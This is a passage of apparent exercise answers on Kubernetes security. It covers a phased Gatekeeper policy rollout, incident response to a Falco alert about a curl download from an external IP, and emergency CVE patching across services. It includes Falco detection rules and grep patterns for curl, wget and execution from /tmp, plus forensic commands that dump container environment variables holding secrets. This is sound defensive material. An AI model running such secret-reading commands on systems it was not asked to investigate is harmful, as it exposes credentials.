    excludedNamespaces:
      - kube-system
      - gatekeeper-system
      - monitoring
      - cert-manager
  parameters:
    allowedWritablePaths:
      - /tmp
      - /var/cache
      - /var/log
      - /var/run
    exemptImages:
      - "888888888888.dkr.ecr.us-east-1.amazonaws.com/debug-"
```

**The corresponding Pod spec that complies:**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: order-svc
spec:
  containers:
    - name: order-svc
      image: 888888888888.dkr.ecr.us-east-1.amazonaws.com/order-svc:v3.2.0
      securityContext:
        readOnlyRootFilesystem: true      # Enforced by policy
      volumeMounts:
        - name: tmp-vol
          mountPath: /tmp
        - name: cache-vol
          mountPath: /var/cache
        - name: log-vol
          mountPath: /var/log
  volumes:
    - name: tmp-vol
      emptyDir:
        sizeLimit: 100Mi
    - name: cache-vol
      emptyDir:
        sizeLimit: 200Mi
    - name: log-vol
      emptyDir:
        sizeLimit: 500Mi
```

---

### 4. Phased Rollout Plan

```text
┌─────────────────────────────────────────────────────────────────────┐
│                   POLICY ROLLOUT: ReadOnlyRootFS                    │
├─────────┬───────────┬──────────────────┬────────────────────────────┤
│ PHASE   │ TIMELINE  │ ENFORCEMENT      │ SUCCESS CRITERIA           │
├─────────┼───────────┼──────────────────┼────────────────────────────┤
│ Phase 0 │ Day 0     │ (recovery)       │ All teams unblocked        │
│ Phase 1 │ Day 1-7   │ dryrun           │ Full violation map         │
│ Phase 2 │ Day 8-14  │ warn             │ <10 violations remain      │
│ Phase 3 │ Day 15-21 │ deny (staging)   │ 0 staging failures         │
│ Phase 4 │ Day 22+   │ deny (prod)      │ 0 violations, 0 pages      │
└─────────┴───────────┴──────────────────┴────────────────────────────┘
```

**Phase 0 — Emergency Recovery (Day 0, NOW)**
- **Action:** Patch to `warn` (done above)
- **Communication:** Post in `#platform-incidents` Slack:
  > "⚠️ Gatekeeper policy K8sRequireReadOnlyRootFS has been rolled back to WARN mode. All deployments are unblocked. Root cause: policy was deployed in deny mode without phased rollout. Postmortem scheduled for Thursday."
- **Success Criteria:** All 6 blocked teams can deploy. Orders team hotfix is in production.

**Phase 1 — Dryrun + Discovery (Days 1–7)**
- **Action:**
  ```bash
  kubectl patch K8sRequireReadOnlyRootFS require-readonly-rootfs \
    --type='merge' -p '{"spec":{"enforcementAction":"dryrun"}}'
  ```
- **Communication:** Email all engineering leads with:
  - The full violation report (from Step 2 above)
  - Migration guide showing how to add `readOnlyRootFilesystem: true` + emptyDir mounts
  - Template Helm values / Kustomize patch they can copy-paste
  - Link to office hours sessions (2 scheduled during the week)
- **Success Criteria:**
  - 100% of violations catalogued by namespace/team
  - Remediation tickets created in each team's backlog
  - At least 50% of teams acknowledge and have a plan

**Phase 2 — Warn + Active Remediation (Days 8–14)**
- **Action:**
  ```bash
  kubectl patch K8sRequireReadOnlyRootFS require-readonly-rootfs \
    --type='merge' -p '{"spec":{"enforcementAction":"warn"}}'
  ```
- **Communication:**
  - Daily Slack digest in `#security-compliance`: "X violations remaining, Y teams still need to remediate"
  - Direct Slack DM to teams with >5 violations on Day 10
  - Deadline warning on Day 12: "Enforcement goes to deny in staging on Day 15"
- **Monitoring:** Grafana dashboard tracking:
  ```promql
  gatekeeper_violations{constraint="require-readonly-rootfs"} 
  ```
- **Success Criteria:**
  - Fewer than 10 unique violations remaining
  - All critical/Tier-1 services compliant
  - Exception requests submitted and reviewed for legitimate edge cases

**Phase 3 — Deny in Staging (Days 15–21)**
- **Action:**
  - Create a staging-only constraint:
  ```yaml
  spec:
    enforcementAction: deny
    match:
      namespaceSelector:
        matchLabels:
          environment: staging
  ```
  - Keep prod constraint at `warn`
- **Communication:**
  - Announce in `#engineering-all`: "ReadOnlyRootFS is now ENFORCED in staging. If your staging deploys fail, your prod deploys will fail next week."
- **Success Criteria:**
  - Zero staging deployment failures for 5 consecutive business days
  - All exception requests processed
  - Runbook written for "how to fix readOnlyRootFilesystem failures"

**Phase 4 — Deny in Production (Day 22+)**
- **Action:**
  ```bash
  kubectl patch K8sRequireReadOnlyRootFS require-readonly-rootfs \
    --type='merge' -p '{"spec":{"enforcementAction":"deny"}}'
  ```
- **Communication:**
  - Announce with 48-hour advance notice
  - On-call team briefed with the runbook
  - `#platform-support` channel monitored for 4 hours post-enforcement
- **Success Criteria:**
  - Zero violations in Gatekeeper audit for 7 consecutive days
  - Zero deployment-blocking pages caused by this policy
  - Policy added to "established" list — no longer in rollout tracking

---

## Q2: Falco Alert Investigation 🔥

### 1. First 10 Minutes — In Exact Order

**Minute 0-1: Acknowledge and assess**
```bash
# ACK the PagerDuty alert to stop escalation
# Open laptop, VPN in, verify kubectl access

# FIRST: Verify this is real, not a test/false positive
kubectl get pod order-svc-7f8b9c6d4-x2k9p -n orders -o wide
```

**Minute 1-2: Capture volatile evidence BEFORE touching anything**
```bash
# Snapshot the pod spec, status, and all metadata
kubectl get pod order-svc-7f8b9c6d4-x2k9p -n orders -o yaml > \
  /tmp/incident-$(date +%s)-pod-spec.yaml

# Capture running processes inside the container
kubectl exec order-svc-7f8b9c6d4-x2k9p -n orders -- ps auxww 2>/dev/null > \
  /tmp/incident-$(date +%s)-processes.txt

# Capture network connections
kubectl exec order-svc-7f8b9c6d4-x2k9p -n orders -- \
  cat /proc/net/tcp /proc/net/tcp6 2>/dev/null > \
  /tmp/incident-$(date +%s)-netstat.txt

# Capture environment variables (may contain tokens/secrets)
kubectl exec order-svc-7f8b9c6d4-x2k9p -n orders -- env 2>/dev/null > \
  /tmp/incident-$(date +%s)-env.txt

# Capture filesystem changes
kubectl exec order-svc-7f8b9c6d4-x2k9p -n orders -- \
  find /tmp /var/tmp /dev/shm -type f -ls 2>/dev/null > \
  /tmp/incident-$(date +%s)-tmp-files.txt
```

**Minute 2-3: ISOLATE THE POD — Network quarantine**
```bash
# Apply a "deny-all" NetworkPolicy to isolate the pod immediately
# This is BEFORE killing it — we want to stop lateral movement while preserving evidence

cat <<EOF | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: quarantine-order-svc-x2k9p
  namespace: orders
spec:
  podSelector:
    matchLabels:
      app: order-svc
  policyTypes:
    - Ingress
    - Egress
  egress:[]      # deny all egress
  ingress:[]     # deny all ingress
EOF
```

> ⚠️ **Critical note:** This isolates ALL order-svc pods, not just the compromised one. This is intentional at this stage — we don't know if other replicas are compromised.

**Minute 3-4: Capture additional forensic data from the isolated pod**
```bash
# Check what the curl command downloaded
kubectl exec order-svc-7f8b9c6d4-x2k9p -n orders -- \
  cat /tmp/update.sh 2>/dev/null > /tmp/incident-$(date +%s)-payload.txt

# Check for any new binaries or suspicious files
kubectl exec order-svc-7f8b9c6d4-x2k9p -n orders -- \
  find / -newer /proc/1/exe -type f 2>/dev/null > \
  /tmp/incident-$(date +%s)-new-files.txt

# Capture the container's filesystem diff if using containerd
# (Run on the NODE, not via kubectl)
NODE=$(kubectl get pod order-svc-7f8b9c6d4-x2k9p -n orders -o jsonpath='{.spec.nodeName}')
echo "Compromised pod is on node: $NODE"
```

**Minute 4-5: Cordon the node to prevent scheduling**
```bash
kubectl cordon $NODE
```

**Minute 5-6: Check Falco for additional alerts in the same timeframe**
```bash
# Query Falco logs for the orders namespace in the last 2 hours
kubectl logs -n falco -l app.kubernetes.io/name=falco --since=2h | \
  grep -i "orders" | tail -50

# Also check for alerts from OTHER namespaces on the same node
kubectl logs -n falco -l app.kubernetes.io/name=falco --since=2h | \
  grep -i "$NODE" | tail -50
```

**Minute 6-7: Check if the service account token was accessed**
```bash
# Check if the attacker accessed the SA token
kubectl exec order-svc-7f8b9c6d4-x2k9p -n orders -- \
  cat /proc/1/mountinfo 2>/dev/null | grep serviceaccount

# Check Kubernetes audit logs for API calls from this pod's SA
# (Assuming audit logs ship to CloudWatch or similar)
aws logs filter-log-events \
  --log-group-name /eks/cluster/audit \
  --filter-pattern '{ $.user.username = "system:serviceaccount:orders:order-svc" }' \
  --start-time $(date -d '2 hours ago' +%s000)
```

**Minute 7-8: Scale up clean replicas and remove the compromised pod from service**
```bash
# Label the compromised pod to remove it from the Service selector
kubectl label pod order-svc-7f8b9c6d4-x2k9p -n orders \
  quarantine=true app- --overwrite

# Remove the broad NetworkPolicy, replace with pod-specific quarantine
kubectl delete networkpolicy quarantine-order-svc-x2k9p -n orders

# Create targeted quarantine for ONLY the compromised pod
cat <<EOF | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: quarantine-compromised-pod
  namespace: orders
spec:
  podSelector:
    matchLabels:
      quarantine: "true"
  policyTypes:
    - Ingress
    - Egress
  egress:[]
  ingress:[]
EOF

# The deployment will automatically spin up a replacement pod
# since we removed the app label (pod no longer matches ReplicaSet selector)
```

**Minute 8-9: Notify and escalate**
```bash
# Post to #security-incidents Slack channel
# "🔴 SECURITY INCIDENT — Active compromise detected in orders namespace.
#  Compromised pod isolated. Investigation in progress. 
#  Impact: order-svc temporarily running at reduced capacity.
#  IC: [Your Name]. Bridge call link:[URL]"
```

**Minute 9-10: Document and verify containment**
```bash
# Verify the compromised pod cannot reach the network
kubectl exec order-svc-7f8b9c6d4-x2k9p -n orders -- \
  wget -T 2 -q http://google.com -O /dev/null 2>&1
# Should fail/timeout

# Verify healthy replicas are serving traffic
kubectl get endpoints order-svc -n orders
kubectl get pods -n orders -l app=order-svc --field-selector=status.phase=Running

# Start incident document with timeline
```

---

### 2. Attacker vs. Developer — Evidence Sources

**Evidence Source 1: The Downloaded Script Content**
```bash
# We already captured this, but analyze it
cat /tmp/incident-*-payload.txt
```
- **If developer:** Script likely contains benign debugging (tcpdump, strace, diagnostic tools), references internal URLs, has comments like "# debug network issue"
- **If attacker:** Script downloads additional binaries, establishes reverse shells, exfiltrates data, mines crypto, or establishes persistence. References external IPs, encodes content in base64, uses `nohup`

**Evidence Source 2: The External IP Reputation**
```bash
# Check 45.33.32.156
# This is actually scanme.nmap.org — well-known, but check anyway
whois 45.33.32.156
curl -s "https://www.virustotal.com/api/v3/ip_addresses/45.33.32.156" \
  -H "x-apikey: $VT_API_KEY" | jq '.data.attributes.last_analysis_stats'
curl -s "https://www.abuseipdb.com/check/45.33.32.156"
```
- **If developer:** IP would be an internal registry, a known CDN, or a tool repository
- **If attacker:** IP flagged as malicious, hosted in bulletproof hosting, associated with C2 infrastructure

**Evidence Source 3: Kubernetes Audit Logs — Who Executed Into the Pod**
```bash
# Check if someone kubectl exec'd into this pod recently
aws logs filter-log-events \
  --log-group-name /eks/cluster/audit \
  --filter-pattern '{ $.verb = "create" && $.objectRef.subresource = "exec" && $.objectRef.namespace = "orders" }' \
  --start-time $(date -d '24 hours ago' +%s000) | jq '.events[].message | fromjson | {user: .user.username, pod: .objectRef.name, timestamp: .requestReceivedTimestamp}'
```
- **If developer:** You'll see a `kubectl exec` from a known developer's IAM role/OIDC identity shortly before the curl command
- **If attacker:** No `kubectl exec` — the command was spawned by the application process itself (parent process is Java/Node, not kubectl), indicating RCE exploitation

**Evidence Source 4: The Process Tree and Parent Chain**
```bash
# Already captured, but the key detail is the parent process
# Alert says: parent=sh, exe=/tmp/curl
# Check the FULL process tree
kubectl exec order-svc-7f8b9c6d4-x2k9p -n orders -- \
  cat /proc/*/status 2>/dev/null | grep -E "^(Name|PPid|Pid)" 
```
- **If developer:** Process tree: `kubectl exec → sh → curl`. Parent PID traces back to the exec session.
- **If attacker:** Process tree: `java (PID 1) → sh → curl`. The shell was spawned by the application runtime, meaning exploitation via the application, not human access.

**Evidence Source 5: Git History and CI/CD Logs**
```bash
# Check if anyone recently modified the order-svc deployment or added a debugging sidecar
git log --since="7 days ago" --oneline -- k8s/orders/
# Check Bitbucket/CI for any recent pipeline runs on order-svc
# Check ArgoCD sync history
kubectl get application order-svc -n argocd -o json | jq '.status.history[-5:]'
```
- **If developer:** Recent commit adding a debug script, or a CronJob/sidecar that runs curl
- **If attacker:** No corresponding code change that explains the curl command

**Evidence Source 6 (Bonus): VPC Flow Logs and DNS Logs**
```bash
# Check VPC Flow Logs for the pod's IP communicating with 45.33.32.156
aws ec2 describe-flow-logs  # find the flow log group
aws logs filter-log-events \
  --log-group-name /vpc/flow-logs \
  --filter-pattern "45.33.32.156"

# Check Route53 DNS query logs for unusual domains
aws logs filter-log-events \
  --log-group-name /route53/resolver/queries \
  --filter-pattern "{ $.srcaddr = \"<POD_IP>\" }"
```

---

### 3. Determining Blast Radius of the RCE Vulnerability

The deserialization RCE in order-svc means **every pod running the same vulnerable image** is potentially exploitable.

```bash
# Step 1: Get the exact image of the compromised pod
VULN_IMAGE=$(kubectl get pod order-svc-7f8b9c6d4-x2k9p -n orders \
  -o jsonpath='{.spec.containers[0].image}')
echo "Vulnerable image: $VULN_IMAGE"
# Output: 888888888888.dkr.ecr.us-east-1.amazonaws.com/order-svc:v3.1.2

# Step 2: Find ALL pods running this exact image across all namespaces
kubectl get pods -A -o json | jq -r --arg img "$VULN_IMAGE" \
  '.items[] | select(.spec.containers[]?.image == $img) |[.metadata.namespace, .metadata.name, .status.podIP, .spec.nodeName] | @tsv'

# Step 3: But it's a DESERIALIZATION bug — check if other services
# use the SAME vulnerable library (not just the same image)
# The vulnerability is in the Java deserialization endpoint.
# Other Java services using the same framework version are also at risk.

# Get all Java-based images in the cluster
kubectl get pods -A -o json | jq -r '
  .items[].spec.containers[] |
  select(.image | test("java|jdk|jre|spring|tomcat")) |
  .image' | sort -u

# Step 4: Check for signs of exploitation on each affected pod
for pod in $(kubectl get pods -A -o json | jq -r --arg img "$VULN_IMAGE" \
  '.items[] | select(.spec.containers[]?.image == $img) |
   "\(.metadata.namespace)/\(.metadata.name)"'); do
  NS=$(echo $pod | cut -d/ -f1)
  NAME=$(echo $pod | cut -d/ -f2)
  echo "=== Checking $NS/$NAME ==="
  kubectl exec -n $NS $NAME -- \
    find /tmp /var/tmp /dev/shm -type f -ls 2>/dev/null
  kubectl exec -n $NS $NAME -- \
    ps auxww 2>/dev/null | grep -v java | grep -v grep
done

# Step 5: Check Falco logs for similar alerts on other pods
kubectl logs -n falco -l app.kubernetes.io/name=falco --since=72h | \
  grep -E "(order-svc|drift|curl|wget|/tmp/)" | grep -v "x2k9p"

# Step 6: Check network logs for connections to the attacker IP from any pod
aws logs filter-log-events \
  --log-group-name /vpc/flow-logs \
  --filter-pattern "45.33.32.156" \
  --start-time $(date -d '7 days ago' +%s000)
```

**Total potentially affected:** Every pod running `order-svc:v3.1.2` (likely 3-5 replicas per environment × number of environments). Plus any other Java services using the same vulnerable deserialization library.

---

### 4. Prevention at Each Security Layer

**Admission Layer — Pod Security**

What was missing: The pod had the ability to run `curl` and pipe to `sh`. This means:
```yaml
# SHOULD have been enforced:
securityContext:
  readOnlyRootFilesystem: true    # Prevents writing /tmp/curl
  allowPrivilegeEscalation: false
  capabilities:
    drop: ["ALL"]
```

```yaml
# NetworkPolicy SHOULD have existed:
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: order-svc-egress
  namespace: orders
spec:
  podSelector:
    matchLabels:
      app: order-svc
  policyTypes:
    - Egress
  egress:
    - to:
        - namespaceSelector:
            matchLabels:
              name: database
      ports:
        - port: 5432
    - to:
        - namespaceSelector:
            matchLabels:
              name: kube-system
      ports:
        - port: 53
          protocol: UDP
    # NO general internet egress — curl to 45.33.32.156 would be BLOCKED
```

**Pod Security Standards:**

A restricted PSS would have forced `readOnlyRootFilesystem: true`, preventing the attacker from writing the `curl` binary to `/tmp`.

**Network Layer:**

A proper NetworkPolicy with explicit egress allowlisting would have blocked the outbound connection to `45.33.32.156` entirely. The attack would have failed at the `curl` stage.

**Runtime Layer — Falco Enhancements:**

```yaml
# Rule that should be added/tuned:
- rule: Unexpected outbound connection from orders namespace
  desc: Detect connections to IPs outside known service mesh
  condition: >
    evt.type in (connect) and
    container and
    k8s.ns.name = "orders" and
    not (fd.sip in (rfc_1918_addresses)) and
    not (fd.sport in (53, 443) and fd.sip in (allowed_external_ips))
  output: >
    Unexpected outbound connection (command=%proc.cmdline connection=%fd.name
    container=%container.name pod=%k8s.pod.name ns=%k8s.ns.name)
  priority: CRITICAL

# Rule for binary execution from writable directories
- rule: Execution from /tmp
  desc: Detect execution of binaries from /tmp or other writable dirs
  condition: >
    spawned_process and
    container and
    (proc.exe startswith "/tmp/" or
     proc.exe startswith "/var/tmp/" or
     proc.exe startswith "/dev/shm/")
  output: >
    Binary executed from writable directory (exe=%proc.exe cmdline=%proc.cmdline
    container=%container.name pod=%k8s.pod.name ns=%k8s.ns.name)
  priority: CRITICAL
```

**Defense-in-Depth Fix Summary:**

| Layer | Gap | Fix |
|-------|-----|-----|
| Pod Security | Writable rootfs | `readOnlyRootFilesystem: true` + emptyDir for /tmp |
| Pod Security | Excessive capabilities | `drop: ["ALL"]`, no privilege escalation |
| Network | Unrestricted egress | Explicit egress NetworkPolicy — allowlist only |
| Runtime | No /tmp execution rule | Falco rule for exec from writable paths |
| Runtime | No egress anomaly detection | Falco rule for unexpected outbound connections |
| Image | curl present in image | Distroless base image, no shell or curl |

---

## Q3: Supply Chain Incident 🔥

### 1. Cross-Referencing ECR Scan Results with Running Workloads

```bash
# Step 1: Get all affected image URIs from ECR Enhanced Scanning
# ECR stores findings per image digest

aws ecr describe-image-scan-findings \
  --repository-name "*" \
  --output json \
  --query 'imageScanFindings.findings[?contains(name, `CVE-2024-XXXX`)]' 

# More practically — get all images with the CVE across all repos:
REPOS=$(aws ecr describe-repositories --query 'repositories[].repositoryName' -o text)

for repo in $REPOS; do
  IMAGES=$(aws ecr list-images --repository-name $repo --query 'imageIds[].imageDigest' -o text)
  for digest in $IMAGES; do
    FINDINGS=$(aws ecr describe-image-scan-findings \
      --repository-name $repo \
      --image-id imageDigest=$digest \
      --query "imageScanFindings.findings[?name=='CVE-2024-XXXX']" \
      --output text 2>/dev/null)
    if [ -n "$FINDINGS" ]; then
      echo "$repo@$digest"
    fi
  done
done > /tmp/vulnerable-images.txt

# Step 2: Get all images currently running in the cluster
kubectl get pods -A -o json | jq -r '
  .items[] |
  . as $pod |
  .status.containerStatuses[]? |
  {
    namespace: $pod.metadata.namespace,
    pod: $pod.metadata.name,
    container: .name,
    image: .image,
    imageID: .imageID
  }' > /tmp/running-images.json

# Step 3: Cross-reference — find running pods with vulnerable images
# The imageID in pod status contains the digest
while read vuln_image; do
  REPO=$(echo $vuln_image | cut -d@ -f1)
  DIGEST=$(echo $vuln_image | cut -d@ -f2)
  
  jq -r --arg digest "$DIGEST" \
    'select(.imageID | contains($digest)) |
     [.namespace, .pod, .container, .image] | @tsv' \
    /tmp/running-images.json
done < /tmp/vulnerable-images.txt | sort -u > /tmp/affected-running-pods.txt

echo "Affected running pods:"
cat /tmp/affected-running-pods.txt
echo "Total: $(wc -l < /tmp/affected-running-pods.txt)"
```

```bash
# FASTER alternative using a single pipeline:
VULN_DIGESTS=$(cat /tmp/vulnerable-images.txt | cut -d@ -f2 | tr '\n' '|' | sed 's/|$//')

kubectl get pods -A -o json | jq -r --arg digests "$VULN_DIGESTS" '
  .items[] |
  . as $pod |
  .status.containerStatuses[]? |
  select(.imageID | test($digests)) |[
    $pod.metadata.namespace,
    $pod.metadata.name,
    .name,
    .image,
    (.imageID | split("@")[1][:12])
  ] | @tsv'
```

---

### 2. Execution Plan — 12 Services, 4-Hour Deadline

```text
HOUR 0:00                    HOUR 1:00              HOUR 2:00              HOUR 3:00              HOUR 4:00
  │                            │                      │                      │                      │
  ├─── TRIAGE & PARALLEL ─────►├── BUILD + SCAN ─────►├── SIGN + DEPLOY ────►├── VERIFY ───────────►│ DONE
  │    PREPARATION             │   (parallel)         │   (rolling)          │                      │
  │                            │                      │                      │                      │
  ▼                            ▼                      ▼                      ▼                      │
```

**Hour 0:00–0:30 — Triage and Preparation (Parallel)**

```bash
# TRACK 1 (You): Risk-rank the 12 services
# Categorize by exposure:
# P0 - Internet-facing + processes untrusted input (order-svc, payment-svc, api-gateway)
# P1 - Internal but handles sensitive data (user-svc, inventory-svc)  
# P2 - Internal, low-sensitivity (search-svc, recommendation-svc, etc.)

# TRACK 2 (Platform engineer): Update base image
# Verify the patched base image exists
docker pull gcr.io/distroless/java17-debian12:latest
# Verify it's actually patched
docker run --rm gcr.io/distroless/java17-debian12:latest \
  dpkg -l | grep libcurl

# TRACK 3 (Security engineer): Assess active exploitation risk
# Check if the CVE is being actively exploited in the wild
# Check CISA KEV catalog
# If actively exploited, consider emergency NetworkPolicy to block
# known exploit vectors while patching
```

**Communication at 0:00:**
> 🔴 `#security-incidents`: "CRITICAL CVE-2024-XXXX in libcurl affects 12 production services. Patch operation starting now. ETA 4 hours. No evidence of active exploitation. Incident Commander: [Name]. Updates every 30 minutes."

**Hour 0:30–2:00 — Parallel Build + Scan**

```bash
# Trigger ALL 12 image rebuilds IN PARALLEL
# Each pipeline: pull new base image → build → Trivy scan → Cosign sign

# For services using tags (9 of 12):
# Simply retrigger the CI pipeline — it will pull :latest base image
for svc in order-svc payment-svc api-gateway user-svc inventory-svc \
           search-svc recommendation-svc notification-svc analytics-svc; do
  # Trigger Bitbucket Pipeline (or equivalent)
  curl -X POST \
    -H "Authorization: Bearer $BB_TOKEN" \
    "https://api.bitbucket.org/2.0/repositories/novamart/$svc/pipelines/" \
    -H "Content-Type: application/json" \
    -d '{"target":{"ref_type":"branch","type":"pipeline_ref_target","ref_name":"main"},
         "variables":[{"key":"EMERGENCY_REBUILD","value":"CVE-2024-XXXX"}]}'
done

# The 3 pinned-digest services are handled separately (see Q3.3)
```

**Safety gates in each pipeline:**
1. ✅ Trivy scan must pass (confirm CVE-2024-XXXX is NOT present)
2. ✅ Cosign signature applied
3. ✅ Unit tests pass
4. ⚠️ Integration tests — run but don't block (time-critical)
5. ✅ Image pushed to ECR with new tag

**Hour 2:00–3:00 — Rolling Deployment (Priority Order)**

```bash
# Deploy P0 services first (internet-facing)
# Use ArgoCD or kubectl with rolling update strategy

# For each service, in priority order:
kubectl set image deployment/$svc $svc=$NEW_IMAGE -n $NAMESPACE

# Monitor each rollout
kubectl rollout status deployment/$svc -n $NAMESPACE --timeout=300s

# Verify the new pods are running the patched image
kubectl get pods -n $NAMESPACE -l app=$svc -o jsonpath='{.items[*].status.containerStatuses[0].imageID}'
```

Deploy order: P0 → P1 → P2, with health checks between each.

**Hour 3:00–3:30 — Verification**

```bash
# Re-run ECR scan on all 12 new images
for img in "${NEW_IMAGES[@]}"; do
  aws ecr start-image-scan --repository-name $REPO --image-id imageTag=$TAG
done

# Verify no running pod has the vulnerable digest
kubectl get pods -A -o json | jq -r '
  .status.containerStatuses[]? | .imageID' | \
  grep -f /tmp/vulnerable-digests.txt
# Should return NOTHING
```

**Hour 3:30–4:00 — Communication and Close**

> ✅ `#security-incidents`: "All 12 services patched and deployed. CVE-2024-XXXX remediated. No evidence of exploitation. Post-incident review scheduled for[date]."

Update the CISO with:
- 12/12 services patched
- Time from alert to full remediation: X hours
- Verification scans clean
- No downtime observed

---

### 3. Handling 3 Pinned-Digest Services (Team on Vacation)

**This is the hardest part — organizational AND technical.**

**Technical Steps:**

```bash
# Step 1: Identify the 3 services and their repos
# Example: checkout-svc, returns-svc, loyalty-svc
# Their Dockerfiles have:
# FROM gcr.io/distroless/java17-debian12@sha256:abc123...

# Step 2: Fork/branch their repos (you have write access as platform team)
for repo in checkout-svc returns-svc loyalty-svc; do
  git clone git@bitbucket.org:novamart/$repo.git
  cd $repo
  git checkout -b security/CVE-2024-XXXX-emergency-patch
  
  # Step 3: Get the patched base image digest
  NEW_DIGEST=$(docker inspect --format='{{index .RepoDigests 0}}' \
    gcr.io/distroless/java17-debian12:latest | cut -d@ -f2)
  
  # Step 4: Update the pinned digest
  sed -i "s|gcr.io/distroless/java17-debian12@sha256:abc123.*|gcr.io/distroless/java17-debian12@${NEW_DIGEST}|g" Dockerfile
  
  git add Dockerfile
  git commit -m "SECURITY: Update base image digest for CVE-2024-XXXX

  Emergency patch - team on vacation.
  Old digest: sha256:abc123...
  New digest: ${NEW_DIGEST}
  
  Approved by: [CISO Name], [Platform Lead Name]
  Incident: INC-2024-XXX"
  
  git push origin security/CVE-2024-XXXX-emergency-patch
  
  # Step 5: Create PR with auto-merge (requires 1 approval from security team)
  # The PR triggers the CI pipeline which builds, scans, signs, and deploys
  cd ..
done
```

**Organizational Considerations:**

1. **Authorization:** Get explicit written approval (Slack message is fine) from:
   - CISO (security authority)
   - Engineering Director or VP (overrides team ownership for emergencies)
   - Document in incident channel: "Modifying code owned by [team] per emergency security protocol. Team is OOO."

2. **Minimize changes:** Change ONLY the digest pin. Nothing else. This minimizes risk of breaking their service.

3. **Notification to the team:**
   - Send an email/Slack DM to each team member: "We made an emergency change to your repo. Here's the PR. Here's why. Please review when you return."
   - Leave detailed PR descriptions explaining exactly what changed and why
   - Tag the PR with `security-emergency` label

4. **Rollback plan:** If any of the 3 services break after the base image update:
   ```bash
   kubectl rollout undo deployment/$svc -n $NAMESPACE
   ```
   And escalate to find someone from the team (call their manager, check emergency contacts).

5. **Policy update:** After this incident, establish that:
   - Pinned digests must have a documented update process
   - Every team must have a designated backup for security emergencies
   - Platform team has standing authorization for base-image-only changes during CVE response

---

### 4. Automated CVE-to-Deploy Pipeline

```text
┌────────────┐    ┌────────────┐    ┌────────────┐    ┌────────────┐    ┌────────────┐
│ CVE FEED   │───►│ CORRELATOR │───►│ DECISION   │───►│ REBUILD    │───►│ DEPLOY     │
│ (Trigger)  │    │ (Match)    │    │ ENGINE     │    │ (Pipeline) │    │ (Rollout)  │
└────────────┘    └────────────┘    └────────────┘    └────────────┘    └────────────┘
```

**Architecture:**

```yaml
# EventBridge rule to trigger on ECR scan findings
# or subscribe to OSV/NVD feeds directly

# 1. TRIGGER: ECR EventBridge → Lambda
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  CVEAlertRule:
    Type: AWS::Events::Rule
    Properties:
      EventPattern:
        source:["aws.ecr"]
        detail-type: ["ECR Image Scan"]
        detail:
          finding-severity-counts:
            CRITICAL: [{"numeric": [">", 0]}]
      Targets:
        - Arn: !GetAtt CVECorrelatorLambda.Arn
          Id: CVECorrelator
```

**Decision Logic (in the Lambda/Step Function):**

```python
def cve_response_handler(event):
    cve_id = event['detail']['finding']['name']
    cvss_score = event['detail']['finding']['cvss']['score']
    affected_images = get_affected_images_from_ecr(cve_id)
    running_in_prod = cross_reference_with_cluster(affected_images)
    
    # DECISION MATRIX
    if cvss_score >= 9.0 and len(running_in_prod) > 0:
        # CRITICAL + running in prod = AUTO-REBUILD with human gate before deploy
        action = "AUTO_REBUILD_GATE_DEPLOY"
        notify_channel = "#security-incidents"
        sla_hours = 4
    elif cvss_score >= 7.0 and len(running_in_prod) > 0:
        # HIGH + running = auto-rebuild, auto-deploy to staging, human gate for prod
        action = "AUTO_REBUILD_AUTO_STAGING_GATE_PROD"
        notify_channel = "#security-alerts"  
        sla_hours = 24
    elif cvss_score >= 7.0:
        # HIGH but not running = ticket + auto-rebuild, no deploy
        action = "AUTO_REBUILD_TICKET"
        notify_channel = "#security-alerts"
        sla_hours = 72
    else:
        # MEDIUM/LOW = ticket only
        action = "TICKET_ONLY"
        notify_channel = "#security-low"
        sla_hours = 168  # 1 week
    
    # Check for CISA KEV (Known Exploited Vulnerabilities)
    if is_in_cisa_kev(cve_id):
        action = "AUTO_REBUILD_GATE_DEPLOY"  # Escalate regardless of CVSS
        sla_hours = min(sla_hours, 4)
    
    return {
        "action": action,
        "affected_services": running_in_prod,
        "cve": cve_id,
        "sla_hours": sla_hours,
        "notify": notify_channel
    }
```

**Safety Gates:**

```text
GATE 1: Rebuild
  ├── ✅ Auto: Trigger CI pipeline for each affected service
  ├── ✅ Auto: Trivy scan confirms CVE is resolved in new image
  └── ✅ Auto: Cosign signs the image

GATE 2: Testing  
  ├── ✅ Auto: Unit tests pass
  ├── ✅ Auto: Integration tests pass
  └── ⚠️ Auto: If tests fail → STOP, alert human, do NOT proceed

GATE 3: Staging Deploy
  ├── ✅ Auto: Deploy to staging
  ├── ✅ Auto: Smoke tests pass
  └── ✅ Auto: 15-min soak period — no errors in logs/metrics

GATE 4: Production Deploy (HUMAN GATE for CVSS ≥ 9.0)
  ├── 🧑 Human: Security engineer approves (Slack interactive message)
  │    "CVE-2024-XXXX patched. 12 services rebuilt. Staging green.
  │[APPROVE PROD DEPLOY] [REJECT] [DEFER 1HR]"
  ├── ✅ Auto: Rolling deploy with canary (10% → 50% → 100%)
  ├── ✅ Auto: Error rate monitoring (auto-rollback if error rate > baseline + 1%)
  └── ✅ Auto: Post-deploy ECR scan confirms clean

GATE 5: Verification
  ├── ✅ Auto: All running pods verified on patched image
  ├── ✅ Auto: JIRA ticket auto-closed with evidence
  └── ✅ Auto: Compliance report updated
```

**For the pinned-digest problem specifically:**

```yaml
# Add a scheduled job that checks for stale pinned digests
apiVersion: batch/v1
kind: CronJob
metadata:
  name: digest-staleness-checker
spec:
  schedule: "0 6 * * *"  # Daily at 6 AM
  jobTemplate:
    spec:
      template:
        spec:
          containers:
            - name: checker
              image: novamart/digest-checker:latest
              # Scans all Dockerfiles in all repos
              # Compares pinned digests to latest available
              # Alerts if pinned digest has known CVEs
              # Creates auto-update PRs when drift detected
```

**Key automation principle:** The pipeline should take a CRITICAL CVE from "published" to "rebuild complete + staging verified" with **zero** human intervention. The only human gate is the **production deploy approval** for CRITICAL severity, and even that has a timeout — if no human responds within 1 hour, it auto-escalates to the VP of Engineering's phone.

---

## Q4: Defense in Depth Failure Analysis 🔥

### CI/CD Layer: Why the Cryptominer Passed

**Why Trivy missed it:**

Trivy is a **vulnerability scanner**, not a **malware scanner**. Here's precisely what it does and doesn't do:

